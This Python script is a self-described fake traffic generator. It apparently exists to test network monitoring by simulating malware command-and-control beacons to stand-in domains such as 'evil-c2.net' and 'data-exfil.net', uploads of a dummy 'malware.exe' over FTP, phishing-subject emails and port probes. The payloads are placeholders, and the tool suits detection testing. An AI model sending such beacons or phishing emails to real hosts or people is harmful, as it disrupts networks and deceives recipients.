#!/usr/bin/env python3

import socket
import threading
import time
import random
import argparse
import json
import requests
import smtplib
from ftplib import FTP
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import dns.resolver
import subprocess
import os
import sys
from datetime import datetime

class TrafficGenerator:
    def __init__(self, target_host="127.0.0.1", duration=300, threads=10):
        self.target_host = target_host
        self.duration = duration
        self.threads = threads
        self.running = False
        self.stats = {
            'http_requests': 0,
            'https_requests': 0,
            'ftp_connections': 0,
            'smtp_connections': 0,
            'dns_queries': 0,
            'tcp_connections': 0,
            'udp_packets': 0,
            'errors': 0
        }
        self.stats_lock = threading.Lock()
        
        # Common malware domains and URLs
        self.malware_domains = [
            'malware-command.com',
            'evil-c2.net',
            'botnet-control.org',
            'fake-update.com',
            'suspicious-download.net',
            'phishing-site.com',
            'trojan-host.org',
            'ransomware-payment.com',
            'data-exfil.net',
            'backdoor-access.com'
        ]
        
        self.malware_urls = [
            '/download/payload.exe',
            '/api/register',
            '/api/checkin',
            '/api/command',
            '/api/upload',
            '/admin/login',
            '/panel/index.php',
            '/gate.php',
            '/config.json',
            '/update.bin',
            '/screenshot.jpg',
            '/keylog.txt',
            '/stolen_data.zip',
            '/ransom_note.txt',
            '/bitcoin_wallet.json'
        ]
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'curl/7.68.0',
            'wget/1.20.3',
            'Python-urllib/3.8',
            'python-requests/2.25.1',
            'Malware-Bot/1.0',
            'TrojanHorse/2.1',
            'Backdoor-Client/1.5'
        ]
    
    def update_stats(self, stat_name, increment=1):
        with self.stats_lock:
            self.stats[stat_name] += increment
    
    def generate_http_traffic(self):
        """Generate HTTP traffic simulating malware communications"""
        while self.running:
            try:
                domain = random.choice(self.malware_domains)
                url = random.choice(self.malware_urls)
                user_agent = random.choice(self.user_agents)
                
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                
                # Add malware-specific headers
                if random.random() < 0.3:
                    headers['X-Bot-ID'] = f"bot_{random.randint(1000, 9999)}"
                    headers['X-Campaign'] = f"campaign_{random.randint(1, 10)}"
                
                full_url = f"http://{domain}{url}"
                
                # Random request type
                if random.random() < 0.7:
                    response = requests.get(full_url, headers=headers, timeout=5)
                else:
                    payload = {
                        'id': random.randint(1, 1000),
                        'status': random.choice(['online', 'offline', 'idle']),
                        'data': 'base64_encoded_data_here',
                        'timestamp': datetime.now().isoformat()
                    }
                    response = requests.post(full_url, json=payload, headers=headers, timeout=5)
                
                self.update_stats('http_requests')
                print(f"[HTTP] {response.status_code} {full_url}")
                
            except Exception as e:
                self.update_stats('errors')
                print(f"[HTTP ERROR] {e}")
            
            time.sleep(random.uniform(0.5, 3.0))
    
    def generate_https_traffic(self):
        """Generate HTTPS traffic simulating secure malware communications"""
        while self.running:
            try:
                domain = random.choice(self.malware_domains)
                url = random.choice(self.malware_urls)
                user_agent = random.choice(self.user_agents)
                
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                }
                
                full_url = f"https://{domain}{url}"
                
                # Simulate encrypted C2 communications
                if random.random() < 0.5:
                    encrypted_payload = {
                        'encrypted_data': 'AES256_encrypted_command_data',
                        'signature': 'RSA_signature_hash',
                        'timestamp': int(time.time())
                    }
                    response = requests.post(full_url, json=encrypted_payload, headers=headers, timeout=5, verify=False)
                else:
                    response = requests.get(full_url, headers=headers, timeout=5, verify=False)
                
                self.update_stats('https_requests')
                print(f"[HTTPS] {response.status_code} {full_url}")
                
            except Exception as e:
                self.update_stats('errors')
                print(f"[HTTPS ERROR] {e}")
            
            time.sleep(random.uniform(1.0, 4.0))
    
    def generate_ftp_traffic(self):
        """Generate FTP traffic simulating file transfers"""
        while self.running:
            try:
                # Use alternative FTP port to avoid conflicts
                ftp = FTP()
                ftp.connect(self.target_host, 2121, timeout=10)
                ftp.login('anonymous', 'malware@evil.com')
                
                # Simulate various FTP operations
                operations = ['pwd', 'list', 'cwd', 'upload', 'download']
                operation = random.choice(operations)
                
                if operation == 'pwd':
                    ftp.pwd()
                elif operation == 'list':
                    ftp.retrlines('LIST')
                elif operation == 'cwd':
                    try:
                        ftp.cwd('/uploads')
                    except:
                        pass
                elif operation == 'upload':
                    # Simulate file upload
                    fake_data = b"Fake malware payload data"
                    ftp.storbinary('STOR malware.exe', fake_data)
                elif operation == 'download':
                    # Simulate file download
                    try:
                        ftp.retrbinary('RETR config.bin', lambda x: None)
                    except:
                        pass
                
                ftp.quit()
                self.update_stats('ftp_connections')
                print(f"[FTP] Connected and performed {operation}")
                
            except Exception as e:
                self.update_stats('errors')
                print(f"[FTP ERROR] {e}")
            
            time.sleep(random.uniform(5.0, 15.0))
    
    def generate_smtp_traffic(self):
        """Generate SMTP traffic simulating email communications"""
        while self.running:
            try:
                server = smtplib.SMTP(self.target_host, 25, timeout=10)
                server.helo('malware-bot.local')
                
                # Simulate sending spam/phishing emails
                msg = MIMEMultipart()
                msg['From'] = 'noreply@malware-bot.com'
                msg['To'] = 'victim@target.com'
                msg['Subject'] = random.choice([
                    'Urgent: Your account has been compromised',
                    'Important security update required',
                    'Your package is ready for delivery',
                    'Congratulations! You have won $1,000,000',
                    'Action required: Verify your identity'
                ])
                
                body = "This is a fake phishing email generated for testing purposes."
                msg.attach(MIMEText(body, 'plain'))
                
                server.sendmail('noreply@malware-bot.com', 'victim@target.com', msg.as_string())
                server.quit()
                
                self.update_stats('smtp_connections')
                print(f"[SMTP] Email sent successfully")
                
            except Exception as e:
                self.update_stats('errors')
                print(f"[SMTP ERROR] {e}")
            
            time.sleep(random.uniform(10.0, 30.0))
    
    def generate_dns_traffic(self):
        """Generate DNS traffic simulating domain lookups"""
        while self.running:
            try:
                domain = random.choice(self.malware_domains)
                
                # Create DNS query
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(5)
                
                # Simple DNS query for A record
                query = self.build_dns_query(domain)
                sock.sendto(query, (self.target_host, 53))
                
                response = sock.recv(1024)
                sock.close()
                
                self.update_stats('dns_queries')
                print(f"[DNS] Queried {domain}")
                
            except Exception as e:
                self.update_stats('errors')
                print(f"[DNS ERROR] {e}")
            
            time.sleep(random.uniform(0.1, 2.0))
    
    def build_dns_query(self, domain):
        """Build a simple DNS query packet"""
        query = b'\x12\x34'  # Transaction ID
        query += b'\x01\x00'  # Flags
        query += b'\x00\x01'  # Questions
        query += b'\x00\x00'  # Answer RRs
        query += b'\x00\x00'  # Authority RRs
        query += b'\x00\x00'  # Additional RRs
        
        # Add domain name
        for part in domain.split('.'):
            query += bytes([len(part)]) + part.encode()
        query += b'\x00'  # End of name
        
        query += b'\x00\x01'  # Type A
        query += b'\x00\x01'  # Class IN
        
        return query
    
    def generate_tcp_traffic(self):
        """Generate raw TCP traffic to various ports"""
        while self.running:
            try:
                ports = [80, 443, 21, 25, 53, 110, 143, 993, 995, 8080, 8443, 3389, 5900]
                port = random.choice(ports)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target_host, port))
                
                # Send some random data
                data = f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n".encode()
                sock.send(data)
                
                response = sock.recv(1024)
                sock.close()
                
                self.update_stats('tcp_connections')
                print(f"[TCP] Connected to port {port}")
                
            except Exception as e:
                self.update_stats('errors')
                print(f"[TCP ERROR] {e}")
            
            time.sleep(random.uniform(1.0, 5.0))
    
    def generate_udp_traffic(self):
        """Generate UDP traffic to various ports"""
        while self.running:
            try:
                ports = [53, 123, 161, 514, 1194, 4500, 5060]
                port = random.choice(ports)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(5)
                
                # Send random UDP data
                data = f"UDP test data {random.randint(1, 1000)}".encode()
                sock.sendto(data, (self.target_host, port))
                
                try:
                    response = sock.recv(1024)
                except socket.timeout:
                    pass
                
                sock.close()
                
                self.update_stats('udp_packets')
                print(f"[UDP] Sent packet to port {port}")
                
            except Exception as e:
                self.update_stats('errors')
                print(f"[UDP ERROR] {e}")
            
            time.sleep(random.uniform(0.5, 3.0))
    
    def print_stats(self):
        """Print traffic statistics"""
        while self.running:
            time.sleep(10)
            with self.stats_lock:
                print(f"\n--- Traffic Statistics ---")
                print(f"HTTP Requests: {self.stats['http_requests']}")
                print(f"HTTPS Requests: {self.stats['https_requests']}")
                print(f"FTP Connections: {self.stats['ftp_connections']}")
                print(f"SMTP Connections: {self.stats['smtp_connections']}")
                print(f"DNS Queries: {self.stats['dns_queries']}")
                print(f"TCP Connections: {self.stats['tcp_connections']}")
                print(f"UDP Packets: {self.stats['udp_packets']}")
                print(f"Errors: {self.stats['errors']}")
                print(f"--- End Statistics ---\n")
    
    def start(self):
        """Start generating traffic"""
        print(f"Starting traffic generation to {self.target_host} for {self.duration} seconds...")
        self.running = True
        
        # Start traffic generators
        generators = [
            self.generate_http_traffic,
            self.generate_https_traffic,
            self.generate_ftp_traffic,
            self.generate_smtp_traffic,
            self.generate_dns_traffic,
            self.generate_tcp_traffic,
            self.generate_udp_traffic
        ]
        
        threads = []
        for generator in generators:
            for _ in range(self.threads // len(generators) + 1):
                thread = threading.Thread(target=generator)
                thread.daemon = True
                thread.start()
                threads.append(thread)
        
        # Start statistics thread
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Run for specified duration
        start_time = time.time()
        try:
            while time.time() - start_time < self.duration:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nStopping traffic generation...")
        
        self.running = False
        
        # Print final stats
        print(f"\n--- Final Statistics ---")
        with self.stats_lock:
            for key, value in self.stats.items():
                print(f"{key.replace('_', ' ').title()}: {value}")

def main():
    parser = argparse.ArgumentParser(description='Fake Network Traffic Generator for Testing')
    parser.add_argument('--host', '-H', default='127.0.0.1', help='Target host (default: 127.0.0.1)')
    parser.add_argument('--duration', '-d', type=int, default=300, help='Duration in seconds (default: 300)')
    parser.add_argument('--threads', '-t', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--protocols', '-p', nargs='+', 
                       choices=['http', 'https', 'ftp', 'smtp', 'dns', 'tcp', 'udp', 'all'],
                       default=['all'], help='Protocols to generate traffic for')
    
    args = parser.parse_args()
    
    generator = TrafficGenerator(args.host, args.duration, args.threads)
    generator.start()

if __name__ == "__main__":
    main()
